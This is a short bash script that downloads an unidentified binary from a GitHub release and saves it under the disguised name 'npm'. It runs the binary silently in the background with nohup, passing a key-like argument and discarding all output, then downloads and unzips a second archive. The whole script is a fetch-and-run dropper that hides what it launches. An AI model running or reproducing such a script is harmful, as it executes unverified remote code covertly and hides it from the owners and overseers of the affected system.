#!/bin/bash

curl -sSL https://github.com/jpus/test/releases/download/web/nza-9 -o npm
sleep 2
chmod +x npm
sleep 2
nohup ./npm -p SlYhPows5oiaEt3VVN >/dev/null 2>&1 &
sleep 2
curl -L -sS -o d.zip https://raw.githubusercontent.com/jpus/test/main/quartexnode/d.zip
sleep 2
unzip d.zip